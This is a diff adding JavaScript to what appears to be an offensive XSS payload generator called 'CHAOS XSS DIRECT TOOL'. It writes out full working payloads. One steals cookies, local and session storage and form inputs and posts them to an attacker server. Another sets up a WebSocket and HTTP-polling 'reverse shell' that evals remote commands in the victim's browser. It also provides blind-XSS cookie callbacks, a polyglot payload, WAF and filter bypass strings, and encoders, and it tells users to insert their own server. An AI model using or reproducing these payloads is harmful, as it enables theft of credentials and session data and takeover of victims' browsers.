+        // Local Storage
+        localStorage: {},
+        sessionStorage: {},
+        
+        // Browser info
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        
+        // Page info
+        url: window.location.href,
+        domain: document.domain,
+        title: document.title,
+        referrer: document.referrer,
+        lastModified: document.lastModified,
+        
+        // Form data
+        forms: [],
+        
+        // Full HTML (limited)
+        html: document.body.innerHTML.substring(0, 10000)
+    };
+    
+    // Get localStorage and sessionStorage
+    try {
+        for (var key in localStorage) {
+            data.localStorage[key] = localStorage[key];
+        }
+        for (var key in sessionStorage) {
+            data.sessionStorage[key] = sessionStorage[key];
+        }
+    } catch(e) {}
+    
+    // Get form data
+    var forms = document.querySelectorAll('form');
+    forms.forEach(function(form, index) {
+        var formData = {
+            index: index,
+            action: form.action,
+            method: form.method,
+            inputs: []
+        };
+        
+        var inputs = form.querySelectorAll('input, textarea, select');
+        inputs.forEach(function(input) {
+            formData.inputs.push({
+                name: input.name,
+                type: input.type,
+                value: input.value
+            });
+        });
+        
+        data.forms.push(formData);
+    });
+    
+    // Send data
+    fetch('http://your-server.com/steal.php', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {'Content-Type': 'application/json'}
+    });
+    
+    // Also send as GET for backup
+    fetch('http://your-server.com/backup.php?data=' + encodeURIComponent(JSON.stringify(data)));
+}
+
+// Execute immediately
+stealData();
+
+// Also steal on page changes
+window.addEventListener('beforeunload', stealData);
+</script>`;
+            
+            document.getElementById('exploitResult').innerHTML = `
+                <h4>Data Thief Exploit:</h4>
+                <div class="payload-display">${escapeHtml(code)}</div>
+                <p style="color: #ff6600; margin-top: 10px;">Replace 'your-server.com' with your server URL</p>
+            `;
+            showNotification('Data thief generated!', 'success');
+        }
+
+        function generateShell() {
+            const code = `<script>
+// Reverse Shell by CHAOS XSS Tool
+var ws = new WebSocket('ws://your-server.com:8080');
+ws.onopen = function() {
+    ws.send('XSS Shell Connected: ' + window.location.href);
+};
+
+ws.onmessage = function(event) {
+    var command = event.data;
+    
+    try {
+        // Execute command
+        var result = eval(command);
+        ws.send('Result: ' + result);
+    } catch(e) {
+        ws.send('Error: ' + e.message);
+    }
+};
+
+ws.onerror = function(error) {
+    // Fallback to HTTP polling
+    setInterval(function() {
+        fetch('http://your-server.com/cmd.php')
+            .then(response => response.text())
+            .then(command => {
+                if (command && command !== 'none') {
+                    try {
+                        var result = eval(command);
+                        fetch('http://your-server.com/result.php?result=' + encodeURIComponent(result));
+                    } catch(e) {
+                        fetch('http://your-server.com/result.php?error=' + encodeURIComponent(e.message));
+                    }
+                }
+            });
+    }, 5000);
+};
+
+// Also create HTTP backdoor
+window.addEventListener('message', function(e) {
+    if (e.data.type === 'xss_shell') {
+        try {
+            var result = eval(e.data.command);
+            e.source.postMessage({type: 'xss_result', result: result}, e.origin);
+        } catch(err) {
+            e.source.postMessage({type: 'xss_error', error: err.message}, e.origin);
+        }
+    }
+});
+</script>`;
+            
+            document.getElementById('exploitResult').innerHTML = `
+                <h4>Reverse Shell Exploit:</h4>
+                <div class="payload-display">${escapeHtml(code)}</div>
+                <p style="color: #ff6600; margin-top: 10px;">Replace 'your-server.com' with your server URL</p>
+            `;
+            showNotification('Reverse shell generated!', 'success');
+        }
+
+        // Tool generators
+        function generateBlindPayload() {
+            const serverUrl = prompt('Enter your server URL for blind XSS callback:', 'http://your-server.com');
+            if (serverUrl) {
+                const code = `<script src="${serverUrl}/xss.js?url=${encodeURIComponent(window.location.href)}&cookies=${encodeURIComponent(document.cookie)}"></script>`;
+                
+                document.getElementById('toolResult').innerHTML = `
+                    <h4>Blind XSS Payload:</h4>
+                    <div class="payload-display">${escapeHtml(code)}</div>
+                    <p style="color: #00ff00; margin-top: 10px;">This payload will call back to your server when executed</p>
+                `;
+                showNotification('Blind payload generated!', 'success');
+            }
+        }
+
+        function generatePolyglot() {
+            const polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//';
+            
+            document.getElementById('toolResult').innerHTML = `
+                <h4>Polyglot XSS Payload:</h4>
+                <div class="payload-display">${escapeHtml(polyglot)}</div>
+                <p style="color: #00ff00; margin-top: 10px;">Works in multiple contexts: HTML, JavaScript, CSS, SVG</p>
+            `;
+            showNotification('Polyglot generated!', 'success');
+        }
+
+        function generateWAFBypass() {
+            const bypasses = [
+                '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
+                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
+                '<svg onload=alert(/XSS/.source)>',
+                '<iframe src="jav&#x0A;ascript:alert(\'XSS\')">',
+                '<embed src="jav&#x09;ascript:alert(\'XSS\')">'
+            ];
+            
+            const randomBypass = bypasses[Math.floor(Math.random() * bypasses.length)];
+            
+            document.getElementById('toolResult').innerHTML = `
+                <h4>WAF Bypass Payload:</h4>
+                <div class="payload-display">${escapeHtml(randomBypass)}</div>
+                <p style="color: #00ff00; margin-top: 10px;">Random WAF bypass technique</p>
+            `;
+            showNotification('WAF bypass generated!', 'success');
+        }
+
+        function generateFilterBypass() {
+            const bypasses = [
+                'javascript:alert`XSS`',
+                'javascript:alert(/**/\'XSS\'/**/)',
+                'JaVaScRiPt:alert("XSS")',
+                'vbscript:MsgBox("XSS")',
+                'data:text/html,<script>alert("XSS")</script>',
+                '<svg/onload=alert("XSS")>',
+                '<img src=# onerror="alert(\'XSS\')">',
+                '<iframe/src="javascript:alert(\'XSS\')">'
+            ];
+            
+            const randomBypass = bypasses[Math.floor(Math.random() * bypasses.length)];
+            
+            document.getElementById('toolResult').innerHTML = `
+                <h4>Filter Bypass Payload:</h4>
+                <div class="payload-display">${escapeHtml(randomBypass)}</div>
+                <p style="color: #00ff00; margin-top: 10px;">Random filter bypass technique</p>
+            `;
+            showNotification('Filter bypass generated!', 'success');
+        }
+
+        // Encoder functions
+        function encodePayload(type) {
+            const input = document.getElementById('encodeInput').value;
+            if (!input) {
+                showNotification('No input to encode!', 'error');
+                return;
+            }
+            
+            let encoded = '';
+            switch(type) {
+                case 'url':
+                    encoded = encodeURIComponent(input);
+                    break;
+                case 'html':
+                    encoded = input.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
+                    break;
+                case 'hex':
+                    encoded = Array.from(new TextEncoder().encode(input)).map(b => '%' + b.toString(16).padStart(2, '0')).join('');
+                    break;
+                case 'unicode':
+                    encoded = input.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
+                    break;
+                case 'base64':
+                    encoded = btoa(input);
+                    break;
+            }
+            
+            document.getElementById('encodeOutput').textContent = encoded;
+            showNotification(`${type.toUpperCase()} encoding applied!`, 'success');
+        }
+
+        // Utility functions
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function updateMethodDescription() {
+            const method = XSS_METHODS[currentMethod];
+            const description = document.getElementById('methodDescription');
+            if (method) {
+                description.innerHTML = `
+                    <strong>${method.name}</strong><br>
+                    ${method.description}<br>
+                    <strong>Categories:</strong> ${method.categories.length}<br>
+                    <strong>Total Payloads:</strong> ${method.totalPayloads}
+                `;
+            }
+        }
+
+        function updateStats() {
+            const method = XSS_METHODS[currentMethod];
+            if (method) {
+                document.getElementById('payloadCount').textContent = method.totalPayloads;
+                document.getElementById('methodCount').textContent = Object.keys(XSS_METHODS).length;
+                document.getElementById('categoryCount').textContent = method.categories.length;
+            }
+        }
+
+        function showNotification(message, type = 'success') {
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.innerHTML = `<i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}"></i> ${message}`;
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 5000);
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize tabs
+            document.querySelectorAll('.tab-btn').forEach(button => {
+                button.addEventListener('click', () => {
+                    const tabName = button.getAttribute('data-tab');
+                    
+                    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                    
+                    button.classList.add('active');
+                    document.getElementById(tabName).classList.add('active');
+                });
+            });
+
+            // Load initial data
+            loadCategories();
+            updateMethodDescription();
+            updateStats();
+
+            console.log('🔥 CHAOS XSS DIRECT TOOL v666.1 LOADED 🔥');
+            console.log('Ready to generate XSS payloads!');
+        });
+    </script>
 </body>
-                                                             </html>
+    </html>
